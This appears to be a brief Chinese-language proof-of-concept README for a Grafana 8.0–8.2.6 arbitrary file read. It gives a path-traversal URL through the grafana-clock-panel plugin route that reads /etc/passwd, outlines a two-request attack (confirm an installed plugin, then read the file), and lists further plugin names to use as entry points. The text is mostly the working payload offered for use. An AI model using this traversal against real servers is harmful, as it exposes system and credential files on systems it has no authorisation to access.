# Grafana-File-Read

影响版本：8.0-8.2.6

<img width="711" alt="wecom-temp-e380dc0174f4d9f46e9e217a6e2c3ddb" src="https://user-images.githubusercontent.com/45926593/144997417-b4d7aaa1-d58d-4a5f-a22c-e8b9b7f16763.png">


/public/plugins/grafana-clock-panel/../../../../../../etc/passwd

grafana-clock-panel需要是已经安装的插件。

所以一个完整的poc可以分2个请求

第一个请求插件，第二个请求文件读取。


整理公开插件目录如下：
alexanderzobnin-zabbix-app
grafana-worldmap-panel
